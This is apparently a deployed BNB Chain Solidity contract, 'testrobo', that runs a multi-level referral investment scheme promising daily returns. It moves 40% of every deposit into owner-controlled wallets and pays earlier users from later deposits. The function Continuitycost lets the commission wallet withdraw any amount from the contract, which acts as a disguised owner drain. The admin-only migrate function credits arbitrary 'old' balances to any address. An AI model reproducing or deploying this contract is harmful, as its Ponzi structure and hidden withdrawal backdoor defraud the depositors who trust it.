/**
 *Submitted for verification at BscScan.com on 2022-07-02
*/

pragma solidity 0.5.17;

contract testrobo {
	using SafeMath for uint256;

	uint256 constant public INVEST_MIN_AMOUNT 	= 1e17; // 0.1 bnb 
	uint256[] public REFERRAL_PERCENTS 			= [700,400,300,200,100];
	uint256[] public PASSIVE_PERCENTS 			= [2500, 2000, 1500, 1000, 800, 600, 600, 600, 600, 600, 400, 400, 400, 400, 400];
    uint256 constant public PROJECT_FEE 		= 500;
    uint256 constant public OWNER_FEE 			= 500;
    uint256 constant public TRADING_FEE 		= 3000;
	uint256 constant public PERCENT_STEP 		= 10;
	uint256 constant public PERCENTS_DIVIDER 	= 10000;
	uint256 constant public PLANPER_DIVIDER 	= 10000;
	uint256 constant public TIME_STEP 			= 1 days;

	uint256 public totalInvested;
	uint256 public totalRefBonus;
	
	
	address chkLv2;
    address chkLv3;
    address chkLv4;
    address chkLv5;
    address chkLv6;
    address chkLv7;
    address chkLv8;
    address chkLv9;
    address chkLv10;
	
	address chkLv11;
	address chkLv12;
    address chkLv13;
    address chkLv14;
    address chkLv15;
   
	
    
    struct RefUserDetail {
        address refUserAddress;
        uint256 refLevel;
    }

    mapping(address => mapping (uint => RefUserDetail)) public RefUser;
    mapping(address => uint256) public referralCount_;
    
	
	mapping(address => address) internal referralLevel1Address;
    mapping(address => address) internal referralLevel2Address;
    mapping(address => address) internal referralLevel3Address;
    mapping(address => address) internal referralLevel4Address;
    mapping(address => address) internal referralLevel5Address;
    mapping(address => address) internal referralLevel6Address;
    mapping(address => address) internal referralLevel7Address;
    mapping(address => address) internal referralLevel8Address;
    mapping(address => address) internal referralLevel9Address;
    mapping(address => address) internal referralLevel10Address;
	
	mapping(address => address) internal referralLevel11Address;
    mapping(address => address) internal referralLevel12Address;
    mapping(address => address) internal referralLevel13Address;
    mapping(address => address) internal referralLevel14Address;
    mapping(address => address) internal referralLevel15Address;
       
	

    struct Plan {
		uint256 time;
        uint256 percent;
    }

    Plan[] internal plans;

	struct Deposit {
        uint8 plan;
		uint256 amount;
		uint256 start;
	}

	struct User {
		Deposit[] deposits;
		uint256 checkpoint;
		address referrer;
		uint256[5] levels;
		uint256 bonus;
		uint256 totalBonus;
		uint256 PASSIVEincome;
		uint256 withdrawn;
		uint256 withdrawnPASSIVE;
		uint256 teambusiness;
        uint256 rankingbonus;
        uint256 rankingwithdrawn;
		bool Copper;
		bool Bronze;
		bool Silver;
		bool Gold;
		bool Platinum;

		uint256 endday;
		uint256 olddividends;
		uint256 oldpassive;
		uint256 oldreferralbonus;
		uint256 oldwithrawan;

	}
	
	mapping (address => User) internal users;

	bool public started;
	address payable public commissionWallet;
    address payable public ownerWallet;
    address payable public traderWallet;

	event Newbie(address user);
	event NewDeposit(address indexed user, uint8 plan, uint256 amount);
	event Withdrawn(address indexed user, uint256 amount);
	event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);
	event PASSIVEIncome(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);
	event FeePayed(address indexed user, uint256 totalAmount);

	constructor(address payable wallet, address payable owner, address payable trader) public {
		require(!isContract(wallet));
		commissionWallet = wallet;
		ownerWallet = owner;
		traderWallet = trader;


        plans.push(Plan(250, 100));
		plans.push(Plan(167, 150));
		plans.push(Plan(125, 200));
		plans.push(Plan(84, 300));
		plans.push(Plan(63, 400));
       
	}
	
	function getDownlineRef(address senderAddress, uint dataId) public view returns (address,uint) { 
        return (RefUser[senderAddress][dataId].refUserAddress,RefUser[senderAddress][dataId].refLevel);
    }
    
    function addDownlineRef(address senderAddress, address refUserAddress, uint refLevel) internal {
        referralCount_[senderAddress]++;
        uint dataId = referralCount_[senderAddress];
        RefUser[senderAddress][dataId].refUserAddress = refUserAddress;
        RefUser[senderAddress][dataId].refLevel = refLevel;
    }

    
	 function distributeRef(address _referredBy,address _sender, bool _newReferral) internal {
       
          address _customerAddress        = _sender;
        // Level 1
        referralLevel1Address[_customerAddress]                     = _referredBy;
        if(_newReferral == true) {
            addDownlineRef(_referredBy, _customerAddress, 1);
        }
        
        chkLv2                          = referralLevel1Address[_referredBy];
        chkLv3                          = referralLevel2Address[_referredBy];
        chkLv4                          = referralLevel3Address[_referredBy];
        chkLv5                          = referralLevel4Address[_referredBy];
        chkLv6                          = referralLevel5Address[_referredBy];
        chkLv7                          = referralLevel6Address[_referredBy];
        chkLv8                          = referralLevel7Address[_referredBy];
        chkLv9                          = referralLevel8Address[_referredBy];
        chkLv10                         = referralLevel9Address[_referredBy];
		
		chkLv11                          = referralLevel10Address[_referredBy];
	    chkLv12                          = referralLevel11Address[_referredBy];
        chkLv13                          = referralLevel12Address[_referredBy];
        chkLv14                          = referralLevel13Address[_referredBy];
        chkLv15                          = referralLevel14Address[_referredBy];
       

		
		
		
		
        // Level 2
        if(chkLv2 != 0x0000000000000000000000000000000000000000) {
            referralLevel2Address[_customerAddress]                     = referralLevel1Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel1Address[_referredBy], _customerAddress, 2);
            }
        }
        
        // Level 3
        if(chkLv3 != 0x0000000000000000000000000000000000000000) {
            referralLevel3Address[_customerAddress]                     = referralLevel2Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel2Address[_referredBy], _customerAddress, 3);
            }
        }
        
        // Level 4
        if(chkLv4 != 0x0000000000000000000000000000000000000000) {
            referralLevel4Address[_customerAddress]                     = referralLevel3Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel3Address[_referredBy], _customerAddress, 4);
            }
        }
        
        // Level 5
        if(chkLv5 != 0x0000000000000000000000000000000000000000) {
            referralLevel5Address[_customerAddress]                     = referralLevel4Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel4Address[_referredBy], _customerAddress, 5);
            }
        }
        
        // Level 6
        if(chkLv6 != 0x0000000000000000000000000000000000000000) {
            referralLevel6Address[_customerAddress]                     = referralLevel5Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel5Address[_referredBy], _customerAddress, 6);
            }
        }
        
        // Level 7
        if(chkLv7 != 0x0000000000000000000000000000000000000000) {
            referralLevel7Address[_customerAddress]                     = referralLevel6Address[_referredBy];
           if(_newReferral == true) {
                addDownlineRef(referralLevel6Address[_referredBy], _customerAddress, 7);
            }
        }
        
        // Level 8
        if(chkLv8 != 0x0000000000000000000000000000000000000000) {
            referralLevel8Address[_customerAddress]                     = referralLevel7Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel7Address[_referredBy], _customerAddress, 8);
            }
        }
        
        // Level 9
        if(chkLv9 != 0x0000000000000000000000000000000000000000) {
            referralLevel9Address[_customerAddress]                     = referralLevel8Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel8Address[_referredBy], _customerAddress, 9);
            }
        }
        
        // Level 10
        if(chkLv10 != 0x0000000000000000000000000000000000000000) {
            referralLevel10Address[_customerAddress]                    = referralLevel9Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel9Address[_referredBy], _customerAddress, 10);
            }
        }
		
		// Level 11
        if(chkLv11 != 0x0000000000000000000000000000000000000000) {
            referralLevel11Address[_customerAddress]                    = referralLevel10Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel10Address[_referredBy], _customerAddress, 11);
            }
        }
		
		 // Level 12
        if(chkLv12 != 0x0000000000000000000000000000000000000000) {
            referralLevel12Address[_customerAddress]                    = referralLevel11Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel11Address[_referredBy], _customerAddress, 12);
            }
        }
		
		 // Level 13
        if(chkLv13 != 0x0000000000000000000000000000000000000000) {
            referralLevel13Address[_customerAddress]                    = referralLevel12Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel12Address[_referredBy], _customerAddress, 13);
            }
        }
		
		 // Level 14
        if(chkLv14 != 0x0000000000000000000000000000000000000000) {
            referralLevel14Address[_customerAddress]                    = referralLevel13Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel13Address[_referredBy], _customerAddress, 14);
            }
        }
		
		 // Level 15
        if(chkLv15 != 0x0000000000000000000000000000000000000000) {
            referralLevel15Address[_customerAddress]                    = referralLevel14Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel14Address[_referredBy], _customerAddress, 15);
            }
        }
	   
       
}
	
	
	function invest(address referrer) public payable {
	
		if (!started) {
			if (msg.sender == commissionWallet) {
				started = true;
			} else revert("Not started yet");
		}
	
		require(msg.value >= INVEST_MIN_AMOUNT);
      
		uint256 fee = msg.value.mul(PROJECT_FEE).div(PERCENTS_DIVIDER);
		commissionWallet.transfer(fee);
		emit FeePayed(msg.sender, fee);
		
		uint256 ownerfee = msg.value.mul(OWNER_FEE).div(PERCENTS_DIVIDER);
		ownerWallet.transfer(ownerfee);
		emit FeePayed(msg.sender, ownerfee);
		
		uint256 traderfee = msg.value.mul(TRADING_FEE).div(PERCENTS_DIVIDER);
		traderWallet.transfer(traderfee);
		emit FeePayed(msg.sender, traderfee);

		User storage user = users[msg.sender];
       
		
		if (user.referrer == address(0)) {
			if (users[referrer].deposits.length > 0 && referrer != msg.sender) {
				user.referrer = referrer;
			}

			address upline = user.referrer;
			for (uint256 i = 0; i < 5; i++) {
				if (upline != address(0)) {
					users[upline].levels[i] = users[upline].levels[i].add(1);
					upline = users[upline].referrer;
				} else break;
			} 
			
		}
		 bool    _newReferral                = true;
        if(referralLevel1Address[msg.sender] != 0x0000000000000000000000000000000000000000) {
            referrer                     = referralLevel1Address[msg.sender];
            _newReferral                    = false;
        }
		
		distributeRef(referrer, msg.sender, _newReferral);
       
		
		if (user.referrer != address(0)) {
			address upline = user.referrer;
			for (uint256 i = 0; i < 5; i++) {
				if (upline != address(0)) {
					uint256 amount = msg.value.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);
					users[upline].bonus = users[upline].bonus.add(amount);
					users[upline].totalBonus = users[upline].totalBonus.add(amount);
					emit RefBonus(upline, msg.sender, i, amount);
					users[upline].teambusiness = users[upline].teambusiness.add(msg.value);
					upline = users[upline].referrer;
				} else break;
			}
            for (uint256 i = 0; i < 15; i++) {
				if (upline != address(0)) {
                    users[upline].teambusiness = users[upline].teambusiness.add(msg.value);
					upline = users[upline].referrer;

				} else break;
			}
		}

		if (user.deposits.length == 0) {
			user.checkpoint = block.timestamp;
			emit Newbie(msg.sender);
		}
		
		uint8 plan;
		if(msg.value >= 1*10**17 && msg.value <= 1*10**18) {
            plan = 0;
        }
        if(msg.value > 1*10**18 && msg.value <= 3*10**18) {
             plan = 1;
        }
		if(msg.value > 3*10**18 && msg.value <= 6*10**18) {
             plan = 2;
        }
		if(msg.value > 6*10**18 && msg.value <= 30*10**18) {
             plan = 3;
        }
        if(msg.value > 30*10**18) {
            plan = 4;
        }
		
		address upline = user.referrer;
		if(users[upline].teambusiness >= 3*10**17 && users[upline].teambusiness < 5*10**17 ){
			if(!users[upline].Copper){
				users[upline].Copper = true;
				users[upline].rankingbonus=users[upline].rankingbonus.add(users[upline].teambusiness.mul(50).div(PERCENTS_DIVIDER));
			}
		}
		if(users[upline].teambusiness >= 5*10**17 && users[upline].teambusiness < 7*10**17 ){
			if(!users[upline].Bronze){
				users[upline].Bronze = true;
				users[upline].rankingbonus=users[upline].rankingbonus.add(users[upline].teambusiness.mul(100).div(PERCENTS_DIVIDER));
			}
		}
		if(users[upline].teambusiness >= 2500*10**18 && users[upline].teambusiness < 5000*10**18 ){
			if(!users[upline].Silver){
				users[upline].Silver = true;
				users[upline].rankingbonus=users[upline].rankingbonus.add(users[upline].teambusiness.mul(200).div(PERCENTS_DIVIDER));
			}
		}
		if(users[upline].teambusiness >= 5000*10**18 && users[upline].teambusiness < 10000*10**18 ){
			if(!users[upline].Gold){
				users[upline].Gold = true;
				users[upline].rankingbonus=users[upline].rankingbonus.add(users[upline].teambusiness.mul(300).div(PERCENTS_DIVIDER));
			}
		}
		if(users[upline].teambusiness >= 10000*10**18 ){
			if(!users[upline].Platinum){
				users[upline].Platinum = true;
				users[upline].rankingbonus=users[upline].rankingbonus.add(users[upline].teambusiness.mul(400).div(PERCENTS_DIVIDER));
			}
		}
		
        
		user.deposits.push(Deposit(plan, msg.value, block.timestamp));

		totalInvested = totalInvested.add(msg.value);

		emit NewDeposit(msg.sender, plan, msg.value);
		
	}

    function withdrawranking() public {
		User storage user = users[msg.sender];
        uint256 rankingbonous = user.rankingbonus;

        uint256 contractBalance = address(this).balance;
        require(rankingbonous <= contractBalance);
        user.rankingwithdrawn = user.rankingwithdrawn.add(rankingbonous);
        user.rankingbonus = 0;
        msg.sender.transfer(rankingbonous);

    }

	function withdraw() public {
		User storage user = users[msg.sender];

			uint256 totalAmount = getUserDividends(msg.sender);
			uint256 PASSIVEAmount = getcurrentPASSIVEincome(msg.sender);

			uint256 referralBonus = getUserReferralBonus(msg.sender);
			
			uint256 totaldeposit = getUserTotalDeposits(msg.sender);

			uint256 oldbalance = user.olddividends.add(user.oldpassive.add(user.oldreferralbonus));
	
			require((totaldeposit.mul(5)) >= (user.withdrawn.add(totalAmount.add(PASSIVEAmount.add(referralBonus.add(oldbalance))))));
			
			totalAmount = totalAmount.add(oldbalance);
			user.olddividends = 0;
			user.oldpassive = 0;
			user.oldreferralbonus = 0;
			
			if (referralBonus > 0) {
				user.bonus = 0;
				totalAmount = totalAmount.add(referralBonus);
			}
			totalAmount = totalAmount.add(PASSIVEAmount);
			user.withdrawnPASSIVE = user.withdrawnPASSIVE.add(PASSIVEAmount);
			
			require(totalAmount > 0, "User has no dividends");

			uint256 contractBalance = address(this).balance;
			if (contractBalance < totalAmount) {
				user.bonus = totalAmount.sub(contractBalance);
				user.totalBonus = user.totalBonus.add(user.bonus);
				totalAmount = contractBalance;
			}
			
		   		
			user.checkpoint = block.timestamp;
			user.withdrawn = user.withdrawn.add(totalAmount);

			msg.sender.transfer(totalAmount);

			emit Withdrawn(msg.sender, totalAmount);
		
	}

	//migrate
	function migrate(address useradd, address referrer, uint256 totaldeposit, uint8 planno, uint256 lastday, uint256 olddividends, uint256 oldpassive, uint256 oldrefbonus, uint256 oldwithdrawn) public {
	
		require (msg.sender == commissionWallet);
	
		User storage user = users[useradd];

		user.endday = lastday;
		user.olddividends = olddividends;
		user.oldpassive = oldpassive;
		user.oldreferralbonus = oldrefbonus;
		user.oldwithrawan = oldwithdrawn;
		
       		
		if (user.referrer == address(0)) {
			if (users[referrer].deposits.length > 0 && referrer != useradd) {
				user.referrer = referrer;
			}

			address upline = user.referrer;
			for (uint256 i = 0; i < 5; i++) {
				if (upline != address(0)) {
					users[upline].levels[i] = users[upline].levels[i].add(1);
					upline = users[upline].referrer;
				} else break;
			} 
			
		}
		 bool    _newReferral                = true;
        if(referralLevel1Address[useradd] != 0x0000000000000000000000000000000000000000) {
            referrer                     = referralLevel1Address[useradd];
            _newReferral                    = false;
        }
		
		distributeRef(referrer, useradd, _newReferral);
       	
		if (user.referrer != address(0)) {
			address upline = user.referrer;
			for (uint256 i = 0; i < 15; i++) {
				if (upline != address(0)) {
                    users[upline].teambusiness = users[upline].teambusiness.add(totaldeposit);
					upline = users[upline].referrer;

				} else break;
			}
		}

		if (user.deposits.length == 0) {
			user.checkpoint = block.timestamp;
			emit Newbie(useradd);
		}
		
				
		address upline = user.referrer;
		if(users[upline].teambusiness >= 3*10**17 && users[upline].teambusiness < 5*10**17 ){
			if(!users[upline].Copper){
				users[upline].Copper = true;
				users[upline].rankingbonus=users[upline].rankingbonus.add(users[upline].teambusiness.mul(50).div(PERCENTS_DIVIDER));
			}
		}
		if(users[upline].teambusiness >= 5*10**17 && users[upline].teambusiness < 7*10**17 ){
			if(!users[upline].Bronze){
				users[upline].Bronze = true;
				users[upline].rankingbonus=users[upline].rankingbonus.add(users[upline].teambusiness.mul(100).div(PERCENTS_DIVIDER));
			}
		}
		if(users[upline].teambusiness >= 2500*10**18 && users[upline].teambusiness < 5000*10**18 ){
			if(!users[upline].Silver){
				users[upline].Silver = true;
				users[upline].rankingbonus=users[upline].rankingbonus.add(users[upline].teambusiness.mul(200).div(PERCENTS_DIVIDER));
			}
		}
		if(users[upline].teambusiness >= 5000*10**18 && users[upline].teambusiness < 10000*10**18 ){
			if(!users[upline].Gold){
				users[upline].Gold = true;
				users[upline].rankingbonus=users[upline].rankingbonus.add(users[upline].teambusiness.mul(300).div(PERCENTS_DIVIDER));
			}
		}
		if(users[upline].teambusiness >= 10000*10**18 ){
			if(!users[upline].Platinum){
				users[upline].Platinum = true;
				users[upline].rankingbonus=users[upline].rankingbonus.add(users[upline].teambusiness.mul(400).div(PERCENTS_DIVIDER));
			}
		}
		
		user.deposits.push(Deposit(planno, totaldeposit, block.timestamp));

		totalInvested = totalInvested.add(totaldeposit);

		emit NewDeposit(useradd, planno, totaldeposit);
		
	}


	function getContractBalance() public view returns (uint256) {
		return address(this).balance;
	}
	
	function Continuitycost(uint256 amount) public{
		if (msg.sender == commissionWallet) {
		   totalInvested = address(this).balance.sub(amount);
			msg.sender.transfer(amount);
		}
	}

	function getPlanInfo(uint8 plan) public view returns(uint256 time, uint256 percent) {
			time = plans[plan].time;
            percent = plans[plan].percent;
	}

	function getUserDividends(address userAddress) public view returns (uint256) {
		User storage user = users[userAddress];

		uint256 totalAmount;
	
		for (uint256 i = 0; i < user.deposits.length; i++) {
			uint256 time  = plans[user.deposits[i].plan].time;
			if(i == 0 && user.endday != 0){
				time = user.endday;
			}

			uint256 finish = user.deposits[i].start.add(time.mul(1 days));
			if (user.checkpoint < finish) {
               	uint256 share = user.deposits[i].amount.mul(plans[user.deposits[i].plan].percent).div(PLANPER_DIVIDER);
				uint256 from = user.deposits[i].start > user.checkpoint ? user.deposits[i].start : user.checkpoint;
				uint256 to = finish < block.timestamp ? finish : block.timestamp;
				if (from < to) {
					totalAmount = totalAmount.add(share.mul(to.sub(from)).div(TIME_STEP));
					
				}
				
			}
		}
		

		return totalAmount;
	}
	
	function getUserPASSIVEIncome(address userAddress) public view returns (uint256){
	
		uint256 totalPASSIVEAmount;
		
		uint256 count = getUserTotalReferrals(userAddress);
		
		for	(uint256 y=1; y<= count; y++)
		{
		    uint256 level;
		    address addressdownline;
		    
		    (addressdownline,level) = getDownlineRef(userAddress, y);
		
			User storage downline =users[addressdownline];
          
          			
			for (uint256 i = 0; i < downline.deposits.length; i++) {

			uint256 time  = plans[downline.deposits[i].plan].time;
			if(i == 0 && downline.endday != 0){
				time = downline.endday;
			}

			uint256 finish = downline.deposits[i].start.add(time.mul(1 days));
			if (downline.deposits[i].start < finish) {
					uint256 share = downline.deposits[i].amount.mul(plans[downline.deposits[i].plan].percent).div(PLANPER_DIVIDER);
					uint256 from = downline.deposits[i].start;
					uint256 to = finish < block.timestamp ? finish : block.timestamp;
					//PASSIVE income
					uint256 PASSIVEshare = share.mul(PASSIVE_PERCENTS[level-1]).div(PERCENTS_DIVIDER);
					
					if (from < to) {
					
							totalPASSIVEAmount = totalPASSIVEAmount.add(PASSIVEshare.mul(to.sub(from)).div(TIME_STEP));	
						
					}
				}
			}

		
		}
		
		return totalPASSIVEAmount;		
	
	} 
	
	
	function getcurrentPASSIVEincome(address userAddress) public view returns (uint256){
	    User storage user = users[userAddress];
	    return (getUserPASSIVEIncome(userAddress).sub(user.withdrawnPASSIVE));
	    
	}
	
	function getUserTotalPASSIVEWithdrawn(address userAddress) public view returns (uint256) {
		return users[userAddress].withdrawnPASSIVE;
	}


	function getUserTotalWithdrawn(address userAddress) public view returns (uint256) {
		return users[userAddress].withdrawn;
	}

	function getUserCheckpoint(address userAddress) public view returns(uint256) {
		return users[userAddress].checkpoint;
	}

	function getUserReferrer(address userAddress) public view returns(address) {
		return users[userAddress].referrer;
	}

	function getUserDownlineCount(address userAddress) public view returns(uint256[5] memory referrals) {
			return (users[userAddress].levels);
	}

	function getUserTotalReferrals(address userAddress) public view returns(uint256) {
				return users[userAddress].levels[0]+users[userAddress].levels[1]+users[userAddress].levels[2]+users[userAddress].levels[3]+users[userAddress].levels[4];
	}

	function getUserReferralBonus(address userAddress) public view returns(uint256) {
		return users[userAddress].bonus;
	}

	function getUserReferralTotalBonus(address userAddress) public view returns(uint256) {
		return users[userAddress].totalBonus;
	}

    function displayrank(address userAddress) public view returns(bool rank1,bool rank2,bool rank3,bool rank4,bool rank5) {
		rank1 = users[userAddress].Copper;
        rank2 = users[userAddress].Bronze;
        rank3 = users[userAddress].Silver;
        rank4 = users[userAddress].Gold;
        rank5 = users[userAddress].Platinum;
	}

    function getUserrankbonus(address userAddress) public view returns(uint256) {
		return users[userAddress].rankingbonus;
	}

    function getUserrankwithdrawn(address userAddress) public view returns(uint256) {
		return users[userAddress].rankingwithdrawn;
	}

    function getUserteambusiness(address userAddress) public view returns(uint256) {
		return users[userAddress].teambusiness;
	}
	
	
	function getUserReferralWithdrawn(address userAddress) public view returns(uint256) {
		return users[userAddress].totalBonus.sub(users[userAddress].bonus);
	}

	function getUserAvailable(address userAddress) public view returns(uint256) {
		return getUserReferralBonus(userAddress).add(getUserDividends(userAddress));
	}

	function getUserAmountOfDeposits(address userAddress) public view returns(uint256) {
		return users[userAddress].deposits.length;
	}

	function getUserTotalDeposits(address userAddress) public view returns(uint256 amount) {
		for (uint256 i = 0; i < users[userAddress].deposits.length; i++) {
			amount = amount.add(users[userAddress].deposits[i].amount);
		}
	}

	function getoldbalance(address userAddress) public view returns( uint256 endday, uint256 olddividends, uint256 oldpassive, uint256 oldreferralbonus, uint256 oldwithdraw){
		 User storage user = users[userAddress];

		endday = user.endday;
		olddividends = user.olddividends;
		oldpassive = user.oldpassive;
		oldreferralbonus = user.oldreferralbonus;
		oldwithdraw = user.oldwithrawan;
		
	}

	function getUserDepositInfo(address userAddress, uint256 index) public view returns(uint8 plan, uint256 percent, uint256 amount, uint256 start, uint256 finish) {
	    User storage user = users[userAddress];

		plan = user.deposits[index].plan;
		percent = plans[plan].percent;
		amount = user.deposits[index].amount;
		start = user.deposits[index].start;
		finish = user.deposits[index].start.add(plans[user.deposits[index].plan].time.mul(1 days));
	}

	function getSiteInfo() public view returns(uint256 _totalInvested, uint256 _totalBonus) {
		return(totalInvested, totalRefBonus);
	}



	function getUserInfo(address userAddress) public view returns(uint256 totalDeposit, uint256 totalWithdrawn, uint256 totalReferrals) {
		return(getUserTotalDeposits(userAddress), getUserTotalWithdrawn(userAddress), getUserTotalReferrals(userAddress));
	}

	function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
}